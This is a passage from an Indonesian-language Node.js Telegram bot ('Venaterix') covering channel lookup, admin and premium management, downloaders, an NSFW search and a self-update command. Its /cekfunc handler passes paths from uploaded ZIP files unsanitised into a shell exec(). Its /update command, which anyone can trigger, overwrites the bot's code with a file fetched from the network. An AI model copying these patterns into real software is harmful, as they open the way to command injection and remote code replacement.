  const senderId = msg.from.id;
  const randomImage = getRandomImage();
  const replyMsg = msg.reply_to_message;

  let targetIdentifier = null;
  let source = '';

  // Mode 1: Reply ke pesan yang diforward dari channel
  if (replyMsg && replyMsg.forward_from_chat) {
    targetIdentifier = replyMsg.forward_from_chat.id;
    source = 'reply';
  }
  // Mode 2: Argument (username, link, ID)
  else if (match[1]) {
    let input = match[1].trim();
    
    // Bersihkan input dari t.me/ atau https://t.me/
    if (input.includes('t.me/')) {
      const parts = input.split('t.me/');
      input = parts[parts.length - 1].split('/')[0].split('?')[0];
      if (!input.startsWith('@')) input = '@' + input;
    }
    
    // Jika sudah dalam format @username atau ID numerik
    if (input.startsWith('@') || /^-?\d+$/.test(input)) {
      targetIdentifier = input;
      source = 'argument';
    } else {
      // Fallback: anggap username biasa, tambahkan @
      targetIdentifier = '@' + input;
      source = 'argument';
    }
  }
  
  // Jika tidak ada target yang valid
  if (!targetIdentifier) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `❌ *Cara penggunaan:*\n\n` +
               `1. Reply pesan yang berasal dari channel\n` +
               `2. Kirim: /cekch @usernamechannel\n` +
               `3. Kirim: /cekch https://t.me/namachannel\n` +
               `4. Kirim: /cekch -1001234567890`,
      parse_mode: 'Markdown'
    });
  }

  // Kirim status loading
  const waitMsg = await bot.sendMessage(chatId, `⏳ *Mengambil informasi channel...*`, {
    parse_mode: 'Markdown'
  });

  try {
    // Ambil info chat
    const chat = await bot.getChat(targetIdentifier);
    
    // Ambil jumlah member (hanya untuk grup/channel publik, jika bot join)
    let memberCount = '🔒 Tidak diketahui';
    try {
      if (chat.type === 'channel' || chat.type === 'supergroup') {
        const count = await bot.getChatMemberCount(chat.id);
        memberCount = count.toLocaleString();
      }
    } catch (e) {
      memberCount = '❌ Gagal mengambil';
    }

    // Ambil foto profil jika ada
    let photoUrl = '';
    try {
      if (chat.photo) {
        const file = await bot.getFile(chat.photo.big_file_id);
        photoUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
      }
    } catch (e) {
      // Abaikan jika gagal
    }

    // Format pesan hasil
    let caption = `┏━━━━━━━━━━━━━━━━━━━┓\n`;
    caption += `┃     🔍 *INFO CHANNEL*     \n`;
    caption += `┗━━━━━━━━━━━━━━━━━━━┛\n\n`;
    caption += `📌 *Nama:* ${chat.title || 'Tidak diketahui'}\n`;
    caption += `🆔 *ID:* \`${chat.id}\`\n`;
    caption += `👤 *Tipe:* ${chat.type === 'channel' ? '📢 Channel' : chat.type === 'supergroup' ? '👥 Grup' : chat.type}\n`;
    
    if (chat.username) {
      caption += `🌐 *Username:* @${chat.username}\n`;
      caption += `🔗 *Link:* https://t.me/${chat.username}\n`;
    } else {
      caption += `🔒 *Username:* Tidak ada (private)\n`;
    }
    
    caption += `👥 *Member:* ${memberCount}\n`;
    caption += `📝 *Deskripsi:* ${chat.description ? chat.description.substring(0, 100) + (chat.description.length > 100 ? '…' : '') : 'Tidak ada'}\n`;
    caption += `⏰ *Dibuat:* ${new Date(chat.date * 1000).toLocaleString('id-ID', { dateStyle: 'medium', timeStyle: 'short' })}\n`;
    caption += `\n📎 *Sumber:* ${source === 'reply' ? 'Reply pesan' : 'Input manual'}\n`;
    caption += `\n━━━━━━━━━━━━━━━━━━━━━\n`;
    caption += `🦋 *Venaterix - Channel Inspector*`;

    // Hapus pesan loading
    await bot.deleteMessage(chatId, waitMsg.message_id).catch(() => {});

    // Kirim hasil dengan foto jika ada, jika tidak kirim pesan biasa
    if (photoUrl) {
      await bot.sendPhoto(chatId, photoUrl, {
        caption: caption,
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [{ text: "📢 BUKA CHANNEL", url: chat.username ? `https://t.me/${chat.username}` : `tg://resolve?domain=${chat.id}` }],
            [{ text: "« BACK", callback_data: "mainmenu" }]
          ]
        }
      });
    } else {
      // Jika tidak ada foto, gunakan random image
      await bot.sendPhoto(chatId, randomImage, {
        caption: caption,
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [{ text: "📢 BUKA CHANNEL", url: chat.username ? `https://t.me/${chat.username}` : `tg://resolve?domain=${chat.id}` }],
            [{ text: "« BACK", callback_data: "mainmenu" }]
          ]
        }
      });
    }

  } catch (error) {
    console.error('CekCh Error:', error.message);
    
    // Hapus pesan loading
    await bot.deleteMessage(chatId, waitMsg.message_id).catch(() => {});

    // Kirim pesan error dengan random image
    let errorMsg = `❌ *Gagal mengambil informasi channel!*\n\n`;
    
    if (error.response?.body?.description) {
      const desc = error.response.body.description;
      if (desc.includes('chat not found')) {
        errorMsg += `⚠️ Channel tidak ditemukan atau bot tidak memiliki akses.\n`;
        errorMsg += `💡 Pastikan:\n`;
        errorMsg += `• Username/ID benar\n`;
        errorMsg += `• Channel publik (jika private, bot harus join)\n`;
        errorMsg += `• Bot tidak dibanned dari channel`;
      } else if (desc.includes('bot was kicked')) {
        errorMsg += `⚠️ Bot telah dikeluarkan dari channel.\n`;
        errorMsg += `💡 Tambahkan bot ke channel sebagai admin.`;
      } else {
        errorMsg += `⚠️ ${desc}`;
      }
    } else {
      errorMsg += `⚠️ ${error.message}`;
    }

    await bot.sendPhoto(chatId, randomImage, {
      caption: errorMsg,
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: "« BACK", callback_data: "mainmenu" }]
        ]
      }
    });
  }
});
///======( Plugin ) ======\\\
bot.onText(/\/connect (.+)/, async (msg, match) => {
       const chatId = msg.chat.id;
       if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
       return bot.sendMessage(
       chatId,
 `
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`,
       { parse_mode: "Markdown" }
       );
       }
       const botNumber = match[1].replace(/[^0-9]/g, "");

       try {
       await connectToWhatsApp(botNumber, chatId);
       } catch (error) {
       console.error("Error in addbot:", error);
       bot.sendMessage(
       chatId,
       "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
      );
      }
      });
      
bot.onText(/^\/gconly (on|off)/i, (msg, match) => {
      const chatId = msg.chat.id;
      const senderId = msg.from.id;
      
      if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, `
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`);
  }
      const mode = match[1].toLowerCase();
      const status = mode === "on";
      setGroupOnly(status);

      bot.sendMessage(msg.chat.id, `Fitur *Group Only* sekarang: ${status ? "AKTIF" : "NONAKTIF"}`, {
      parse_mode: "Markdown",
      });
      });
      
bot.onText(/\/setjeda (\d+[smh])/, (msg, match) => { 
     const chatId = msg.chat.id; 
     const response = setCooldown(match[1]);

     bot.sendMessage(chatId, response); });

const moment = require('moment');
bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
     const chatId = msg.chat.id;
     const senderId = msg.from.id;
     if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
     return bot.sendMessage(chatId, `
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`);
     }

     if (!match[1]) {
     return bot.sendMessage(chatId, `
❌ Command salah, Masukan user id serta waktu expired, Example: /addprem 58273654 30d`);
     }

     const args = match[1].split(' ');
     if (args.length < 2) {
     return bot.sendMessage(chatId, `
❌ Command salah, Masukan user id serta waktu expired, Example: /addprem 58273654 30d`);
     }

    const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
    const duration = args[1];
  
    if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(chatId, `
❌ Command salah, Masukan user id serta waktu expired, Example: /addprem 58273654 30d`);
    }
  
    if (!/^\d+[dhm]$/.test(duration)) {
   return bot.sendMessage(chatId, `
❌ Command salah, Masukan user id serta waktu expired, Example: /addprem 58273654 30d`);
   }
   
    const now = moment();
    const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

    if (!premiumUsers.find(user => user.id === userId)) {
    premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
    savePremiumUsers();
    console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
    bot.sendMessage(chatId, `
✅Berhasil, kini user ${userId} Sudah memiliki akses premium hingga ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
    } else {
    const existingUser = premiumUsers.find(user => user.id === userId);
    existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
     }
     });

bot.onText(/\/listprem/, (msg) => {
     const chatId = msg.chat.id;
     const senderId = msg.from.id;

     if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
     return bot.sendMessage(chatId, `
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`);
  }

      if (premiumUsers.length === 0) {
      return bot.sendMessage(chatId, "📌 No premium users found.");
  }

      let message = "```";
      message += "\n";
      message += " ( + )  LIST PREMIUM USERS\n";
      message += "\n";
      premiumUsers.forEach((user, index) => {
      const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
      message += `${index + 1}. ID: ${user.id}\n   Exp: ${expiresAt}\n`;
      });
      message += "\n```";

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
      const chatId = msg.chat.id;
      const senderId = msg.from.id
      
        if (!isOwner(senderId)) {
        return bot.sendMessage(
        chatId,`
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`);

        { parse_mode: "Markdown" }
   
        }

      if (!match || !match[1]) 
      return bot.sendMessage(chatId, `
❌ Command salah, Masukan user id serta waktu expired, /addadmin 58273654 30d`);
      
      const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
      if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId,`
❌ Command salah, Masukan user id serta waktu expired, /addadmin 58273654 30d`);
      }

      if (!adminUsers.includes(userId)) {
      adminUsers.push(userId);
      saveAdminUsers();
      console.log(`${senderId} Added ${userId} To Admin`);
      bot.sendMessage(chatId, `
✅Berhasil menambahkan admin, kini user ${userId} Memiliki aksess admin. `);
      } else {
      bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
      }
      });

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
          const chatId = msg.chat.id;
          const senderId = msg.from.id;
          if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
          return bot.sendMessage(chatId, `
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`);
          }
          if (!match[1]) {
          return bot.sendMessage(chatId,`
❌ Command salah! Contoh /delprem 584726249 30d.`);
          }
          const userId = parseInt(match[1]);
          if (isNaN(userId)) {
          return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
          }
          const index = premiumUsers.findIndex(user => user.id === userId);
          if (index === -1) {
          return bot.sendMessage(chatId, `❌ User ${userId} tidak terdaftar di dalam list premium.`);
          }
                premiumUsers.splice(index, 1);
                savePremiumUsers();
         bot.sendMessage(chatId, `
✅ Berhasil menghapus user ${userId} dari daftar premium. `);
         });

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
        const chatId = msg.chat.id;
        const senderId = msg.from.id;
        if (!isOwner(senderId)) {
        return bot.sendMessage(
        chatId,`
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`,

        { parse_mode: "Markdown" }
        );
        }
        if (!match || !match[1]) {
        return bot.sendMessage(chatId, `
❌Comand salah, Contoh /deladmin 5843967527 30d.`);
        }
        const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
        if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, `
❌Comand salah, Contoh /deladmin 5843967527 30d.`);
        }
        const adminIndex = adminUsers.indexOf(userId);
        if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `
✅ Berhasil menghapus user ${userId} dari daftar admin.`);
        } else {
        bot.sendMessage(chatId, `❌ User ${userId} Belum memiliki aksess admin.`);
        }
        });

bot.onText(/\/cekidch (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const link = match[1];

    const result = await getWhatsAppChannelInfo(link, sock);

    if (result.error) {
        return bot.sendMessage(chatId, `⚠️ ${result.error}`);
    }

    const teks = `
📢 *Informasi Channel WhatsApp*
🔹 *ID:* ${result.id}
🔹 *Nama:* ${result.name}
🔹 *Deskripsi:* ${result.description}
🔹 *Followers:* ${result.followers}
🔹 *Verified:* ${result.verified}
`;

    bot.sendMessage(chatId, teks, { parse_mode: "Markdown" });
});

//ALL TOOLS
// FIX PREMIUM CHECK (semua user bisa)
async function checkPremium(msg) {
  return true;
}


const dns = require("dns").promises;
const cheerio = require("cheerio");

/* ===========================================================
   MEDIAFIRE DOWNLOADER — UPGRADE INFO FILE
=========================================================== */
const { exec } = require("child_process");
const AdmZip = require("adm-zip");

// Utility untuk ambil baris error dari stderr node
function parseNodeError(stderr, fileContent) {
  const lines = stderr.split("\n");
  const errorMsg = [];
  for (let line of lines) {
    if (line.includes("SyntaxError") || line.includes("ReferenceError") || line.includes("Unexpected")) {
      errorMsg.push(line);
      const match = line.match(/<anonymous>:(\d+):(\d+)/);
      if (match) {
        const lineNum = parseInt(match[1], 10);
        const colNum = parseInt(match[2], 10);
        const codeLines = fileContent.split("\n");
        const start = Math.max(0, lineNum - 3);
        const end = Math.min(codeLines.length, lineNum + 2);
        const snippet = codeLines.slice(start, end).map((l, i) => {
          const pointer = (i + start + 1 === lineNum) ? ">> " : "   ";
          return `${pointer}${i + start + 1}: ${l}`;
        }).join("\n");
        errorMsg.push(snippet);
      }
    }
  }
  return errorMsg.join("\n");
}
// Command /cekfunc
// ===========================================
// 🔍 CEK FUNGSI JS/ZIP - VENATERIX INVICTUS
// ===========================================
// Mengecek syntax error pada file JavaScript
// Support: file .js tunggal atau arsip .zip
// ===========================================

bot.onText(/\/cekfunc/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const randomImage = getRandomImage();

  // ⚠️ Premium check (fitus tools hanya untuk user premium)
  if (!(await checkPremium(msg))) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `❌ *Akses ditolak.*\nFitur ini hanya untuk user premium.`,
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: "📞 вυу α¢¢ѕєѕ", url: "https://t.me/VinxzGanteng", style : "success" }]
        ]
      }
    });
  }

  // Validasi: harus reply ke file
  if (!msg.reply_to_message || !msg.reply_to_message.document) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `🪧 *Format:* /cekfunc (reply ke file .js atau .zip)`,
      parse_mode: 'Markdown'
    });
  }

  const fileId = msg.reply_to_message.document.file_id;
  const fileName = msg.reply_to_message.document.file_name;
  const fileExt = path.extname(fileName).toLowerCase();

  if (!['.js', '.zip'].includes(fileExt)) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `❌ *Format file tidak didukung.*\nGunakan file .js atau .zip.`,
      parse_mode: 'Markdown'
    });
  }

  const waitMsg = await bot.sendMessage(chatId, `⏳ *Menganalisis file...*`, {
    parse_mode: 'Markdown'
  });

  try {
    const fileLink = await bot.getFileLink(fileId);
    const tempPath = path.join(__dirname, `venaterix_cek_${Date.now()}${fileExt}`);
    const { data } = await axios.get(fileLink, { responseType: 'arraybuffer' });
    fs.writeFileSync(tempPath, Buffer.from(data));

    const results = [];
    let totalFiles = 0;
    let errorFiles = 0;

    // Fungsi pengecekan JS
    const checkJSFile = async (jsPath, relativeName) => {
      const content = fs.readFileSync(jsPath, 'utf-8');
      return new Promise((resolve) => {
        exec(`node --check "${jsPath}"`, (error, stdout, stderr) => {
          totalFiles++;
          if (error) {
            errorFiles++;
            const detailedError = parseNodeError(stderr, content);
            results.push(`❌ *${relativeName}*\n\`\`\`\n${detailedError.substring(0, 300)}${detailedError.length > 300 ? '…' : ''}\n\`\`\``);
          } else {
            results.push(`✅ *${relativeName}* — Tidak ditemukan error.`);
          }
          resolve();
        });
      });
    };

    // Proses file sesuai ekstensi
    if (fileExt === '.js') {
      await checkJSFile(tempPath, fileName);
    } else if (fileExt === '.zip') {
      const zip = new AdmZip(tempPath);
      const extractDir = path.join(__dirname, `venaterix_extract_${Date.now()}`);
      zip.extractAllTo(extractDir, true);

      // Kumpulkan semua file .js
      const jsFiles = [];
      const walkDir = (dir) => {
        const files = fs.readdirSync(dir);
        for (const file of files) {
          const fullPath = path.join(dir, file);
          const stat = fs.statSync(fullPath);
          if (stat.isDirectory()) walkDir(fullPath);
          else if (path.extname(fullPath).toLowerCase() === '.js') jsFiles.push(fullPath);
        }
      };
      walkDir(extractDir);

      if (jsFiles.length === 0) {
        results.push('⚠️ *Tidak ada file .js* di dalam arsip ZIP.');
      } else {
        for (const jsFile of jsFiles) {
          const relativeName = path.relative(extractDir, jsFile);
          await checkJSFile(jsFile, relativeName);
        }
      }

      // Bersihkan direktori ekstrak
      fs.rmSync(extractDir, { recursive: true, force: true });
    }

    // Hapus file sementara
    fs.unlinkSync(tempPath);
    await bot.deleteMessage(chatId, waitMsg.message_id).catch(() => {});

    // ===== KIRIM HASIL ANALISIS =====
    const header = `┏━━━━━━━━━━━━━━━━━━━┓\n┃   🔍 *HASIL CEK FUNGSI*   \n┗━━━━━━━━━━━━━━━━━━━┛\n\n📁 *File:* \`${fileName}\`\n📊 *Total file JS:* ${totalFiles}\n❌ *File error:* ${errorFiles}\n✅ *File aman:* ${totalFiles - errorFiles}\n━━━━━━━━━━━━━━━━━━━━━\n\n`;

    let fullReport = header;
    for (const res of results) {
      if ((fullReport + res).length > 4000) {
        await bot.sendMessage(chatId, fullReport, { parse_mode: 'Markdown' });
        fullReport = res + '\n';
      } else {
        fullReport += res + '\n━━━━━━━━━━━━━━━━━━━━━\n';
      }
    }

    if (fullReport.trim().length > 0) {
      await bot.sendMessage(chatId, fullReport, { parse_mode: 'Markdown' });
    }

    // Kirim ringkasan akhir
    const summary = errorFiles === 0
      ? `✅ *Semua file JavaScript valid!* Tidak ditemukan syntax error.`
      : `⚠️ *Ditemukan ${errorFiles} file bermasalah.* Perbaiki error sebelum digunakan.`;

    await bot.sendMessage(chatId, summary, { parse_mode: 'Markdown' });

  } catch (err) {
    console.error('CekFunc Error:', err.message);
    await bot.deleteMessage(chatId, waitMsg.message_id).catch(() => {});

    // Bersihkan file sisa jika ada
    try {
      const files = fs.readdirSync(__dirname);
      files.forEach(f => {
        if (f.startsWith('venaterix_cek_') || f.startsWith('venaterix_extract_')) {
          const full = path.join(__dirname, f);
          const stat = fs.statSync(full);
          if (stat.isDirectory()) fs.rmSync(full, { recursive: true, force: true });
          else fs.unlinkSync(full);
        }
      });
    } catch {}

    await bot.sendPhoto(chatId, randomImage, {
      caption: `❌ *Gagal menganalisis file.*\nPastikan file tidak korup atau coba lagi nanti.\n\n⚠️ ${err.message}`,
      parse_mode: 'Markdown'
    });
  }
});

bot.onText(/\/getmediafire(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const randomImage = getRandomImage();

  // ⚠️ Premium check (fitur ini hanya untuk user premium)
  if (!(await checkPremium(msg))) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `❌ *Akses ditolak.*\nFitur ini hanya untuk user premium.`,
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: "📞 вυу α¢¢ѕєѕ", url: "https://t.me/VinxzGanteng", style : "success" }]
        ]
      }
    });
  }

  // Ambil link dari command atau reply
  let link = match[1]?.trim();
  if (!link && msg.reply_to_message) {
    link = msg.reply_to_message.text?.trim();
  }

  if (!link) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `❌ *Kirim link Mediafire* via command atau reply ke link.\n\nContoh:\n/getmediafire https://www.mediafire.com/file/xxx/file.zip`,
      parse_mode: 'Markdown'
    });
  }

  // Validasi format link Mediafire
  if (!link.includes('mediafire.com')) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `❌ *Link tidak valid.*\nPastikan link dari mediafire.com`,
      parse_mode: 'Markdown'
    });
  }

  const waitMsg = await bot.sendMessage(chatId, `⏳ *Mengambil file dari Mediafire...*`, {
    parse_mode: 'Markdown'
  });

  try {
    // Ambil halaman HTML Mediafire
    const { data } = await axios.get(link, { timeout: 15000 });
    const $ = cheerio.load(data);

    // Cari link direct download
    let downloadLink = $('a#downloadButton').attr('href') || 
                      $('a[aria-label="Download file"]').attr('href');
    
    if (!downloadLink) {
      throw new Error('Direct download link tidak ditemukan');
    }

    // Ambil nama file
    const fileName = decodeURIComponent(path.basename(downloadLink.split('?')[0]));

    // Ambil ukuran file
    let fileSize = $('.download_link .details li:contains("Size") span').text() || 
                   $('.dl-btn-label span:contains("Size")').parent().text() ||
                   $('a#downloadButton + div span').text() || 
                   'Unknown';
    
    fileSize = fileSize.replace(/[^\d.,\sMBGBK]/gi, '').trim() || 'Unknown';

    // Hapus pesan loading
    await bot.deleteMessage(chatId, waitMsg.message_id).catch(() => {});

    // Kirim info file terlebih dahulu
    await bot.sendMessage(chatId,
      `📄 *INFO FILE MEDIAFIRE*\n━━━━━━━━━━━━━━━━━━━━━\n\n` +
      `📁 *Nama:* \`${fileName}\`\n` +
      `📦 *Ukuran:* ${fileSize}\n` +
      `🔗 *Source:* [Link Mediafire](${link})\n\n` +
      `⏳ *Sedang mengunduh & mengirim...*`,
      { parse_mode: 'Markdown', disable_web_page_preview: true }
    );

    // Download file sementara
    const response = await axios.get(downloadLink, { 
      responseType: 'stream',
      timeout: 60000 
    });
    
    const filePath = path.join(__dirname, `venaterix_${Date.now()}_${fileName}`);
    const writer = fs.createWriteStream(filePath);
    response.data.pipe(writer);

    // Tunggu sampai selesai download
    await new Promise((resolve, reject) => {
      writer.on('finish', resolve);
      writer.on('error', reject);
    });

    // Cek ukuran file (max 50MB untuk Telegram bot)
    const stats = fs.statSync(filePath);
    const fileSizeMB = stats.size / (1024 * 1024);
    
    if (fileSizeMB > 50) {
      fs.unlinkSync(filePath);
      return bot.sendPhoto(chatId, randomImage, {
        caption: `❌ *File terlalu besar!*\nMaksimal 50MB untuk dikirim via Telegram.\n\n📦 Ukuran file: ${fileSizeMB.toFixed(2)}MB`,
        parse_mode: 'Markdown'
      });
    }

    // Kirim file ke Telegram
    await bot.sendDocument(chatId, filePath, {
      caption: `✅ *Berhasil diunduh!*\n📁 ${fileName}\n📦 ${fileSize}`,
      parse_mode: 'Markdown'
    });

    // Hapus file sementara
    fs.unlinkSync(filePath);

  } catch (e) {
    console.error('Mediafire Error:', e.message);
    
    // Hapus pesan loading jika masih ada
    await bot.deleteMessage(chatId, waitMsg.message_id).catch(() => {});

    // Hapus file sementara jika ada error
    try {
      const files = fs.readdirSync(__dirname);
      files.forEach(file => {
        if (file.startsWith('venaterix_') && file.endsWith('.tmp')) {
          fs.unlinkSync(path.join(__dirname, file));
        }
      });
    } catch (err) {}

    let errorMsg = `❌ *Gagal download file dari Mediafire.*\n\n`;
    
    if (e.message.includes('Direct download link')) {
      errorMsg += `⚠️ Link download tidak ditemukan.\nPastikan file masih tersedia.`;
    } else if (e.code === 'ECONNABORTED') {
      errorMsg += `⚠️ Timeout, server Mediafire lambat.`;
    } else {
      errorMsg += `⚠️ ${e.message}`;
    }

    await bot.sendPhoto(chatId, randomImage, {
      caption: errorMsg,
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: "🔄 Coba Lagi", url: link }]
        ]
      }
    });
  }
});
/* ===========================================================
   1. IP DOMAIN CHECK
=========================================================== */
bot.onText(/\/ipdomainc(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const randomImage = getRandomImage();
  const domain = match[1]?.trim();

  // ⚠️ Premium check (sesuai dengan command tools lainnya)
  if (!(await checkPremium(msg))) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `❌ *Akses ditolak.*\nFitur ini hanya untuk user premium.`,
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: "📞 вυу α¢¢ѕєѕ", url: "https://t.me/VinxzGanteng", style : "success" }]
        ]
      }
    });
  }

  // Validasi input
  if (!domain) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `🪧 *Format:* /ipdomainc [domain/ip]\n\nContoh:\n/ipdomainc google.com\n/ipdomainc 8.8.8.8`,
      parse_mode: 'Markdown'
    });
  }

  const waitMsg = await bot.sendMessage(chatId, `⏳ *Mengecek IP domain...*`, {
    parse_mode: 'Markdown'
  });

  try {
    const result = await dns.lookup(domain);
    
    // Hapus pesan loading
    await bot.deleteMessage(chatId, waitMsg.message_id).catch(() => {});

    // Kirim hasil
    await bot.sendMessage(chatId,
      `🌐 *Domain:* ${domain}\n📍 *IP Address:* ${result.address}`,
      { parse_mode: 'Markdown' }
    );

  } catch (e) {
    console.error('DNS Lookup Error:', e.message);
    
    // Hapus pesan loading
    await bot.deleteMessage(chatId, waitMsg.message_id).catch(() => {});

    // Kirim pesan error dengan foto
    await bot.sendPhoto(chatId, randomImage, {
      caption: `❌ *Domain tidak valid* atau tidak dapat di-resolve.\n\nContoh: /ipdomainc google.com`,
      parse_mode: 'Markdown'
    });
  }
});


/* ===========================================================
   2. TIKTOK DOWNLOADER
=========================================================== */
bot.onText(/\/tiktokdl (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const url = match[1];

  let wait;
  try {
    wait = await bot.sendMessage(chatId, "⏳ Mengambil video...");

    const { data } = await axios.post(
      "https://tikwm.com/api/",
      { url },
      { headers: { "Content-Type": "application/json", "User-Agent": "Mozilla/5.0" } }
    );

    const videoUrl = data?.data?.play;
    if (!videoUrl) throw new Error("Video tidak tersedia");

    await bot.sendPhoto(chatId, videoUrl, { caption: "📥 TikTok Downloader" });

  } catch (e) {
    await bot.sendMessage(chatId, "❌ Gagal download video TikTok.");
  }

  try { if (wait) await bot.deleteMessage(chatId, wait.message_id); } catch {}
});


/* ===========================================================
   3. PINTEREST SEARCH
=========================================================== */
bot.onText(/\/pinterest(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const randomImage = getRandomImage();
  const query = match[1]?.trim();

  // ⚠️ Premium check
  if (!(await checkPremium(msg))) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `❌ *Akses ditolak.*\nFitur ini hanya untuk user premium.`,
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: "📞 вυу α¢¢ѕєѕ", url: "https://t.me/VinxzGanteng", style : "success" }]
        ]
      }
    });
  }

  if (!query) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `🪧 *Format:* /pinterest [kata kunci]\n\nContoh:\n/pinterest anime girl`,
      parse_mode: 'Markdown'
    });
  }

  const waitMsg = await bot.sendMessage(chatId, `⏳ *Mencari gambar di Pinterest...*`, {
    parse_mode: 'Markdown'
  });

  try {
    const { data } = await axios.get('https://pinterest-api-two.vercel.app/', {
      params: { q: query },
      timeout: 15000
    });

    if (!data?.result?.length) {
      throw new Error('Tidak ada hasil');
    }

    await bot.deleteMessage(chatId, waitMsg.message_id).catch(() => {});

    const images = data.result.slice(0, 5); // Maksimal 5 gambar

    for (const imgUrl of images) {
      try {
        await bot.sendPhoto(chatId, imgUrl, {
          caption: `📌 *Pinterest* | *${query}*`,
          parse_mode: 'Markdown'
        });
        // Delay kecil agar tidak kena spam limit
        await new Promise(resolve => setTimeout(resolve, 500));
      } catch (imgErr) {
        console.error('Gagal kirim gambar:', imgErr.message);
        // Skip jika satu gambar gagal
      }
    }

    // Kirim notifikasi selesai
    await bot.sendMessage(chatId, `✅ *${images.length} gambar* berhasil dikirim.`, {
      parse_mode: 'Markdown'
    });

  } catch (err) {
    console.error('Pinterest Error:', err.message);
    await bot.deleteMessage(chatId, waitMsg.message_id).catch(() => {});

    await bot.sendPhoto(chatId, randomImage, {
      caption: `❌ *Tidak ditemukan hasil untuk* \`${query}\`\nCoba kata kunci lain.`,
      parse_mode: 'Markdown'
    });
  }
});


/* ===========================================================
   4. NSFW SEARCH
=========================================================== */
bot.onText(/\/nsfw(?:\s+(.+))?/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const tag = match?.[1];

  if (!tag) {
    return bot.sendMessage(
      chatId,
      "🔞 Gunakan:\n/nsfw <tag>\n\nContoh:\n/nsfw anime",
    );
  }

  let wait;
  try {
    wait = await bot.sendMessage(
      chatId,
      "🔞 NSFW 18+ — Mencari konten..."
    );

    const results = await fetchNSFW(tag);

    if (!results.length) {
      return bot.sendMessage(chatId, "❌ Konten tidak ditemukan.");
    }

    for (const url of results.slice(0, 5)) {
      await bot.sendPhoto(chatId, url, {
        caption: `🔞 NSFW Result\nTag: ${tag}\n\nby denix`
      });
    }

  } catch (e) {
    await bot.sendMessage(chatId, "❌ Gagal mengambil NSFW.");
  }

  try { if (wait) await bot.deleteMessage(chatId, wait.message_id); } catch {}
});
bot.onText(/\/update/, async (msg) => {
    const chatId = msg.chat.id;

    const repoRaw = "https://raw.githubusercontent.com/NAMA-AKUN/NAMA-REPO/main/index.js";

    bot.sendMessage(chatId, "⏳ Sedang mengecek update...");

    try {
        const { data } = await axios.get(repoRaw);

        if (!data) return bot.sendMessage(chatId, "❌ Update gagal: File kosong!");

        fs.writeFileSync("./index.js", data);

        bot.sendMessage(chatId, "✅ Update berhasil!\nSilakan restart bot.");

        process.exit(); // restart jika pakai PM2
    } catch (e) {
        console.log(e);
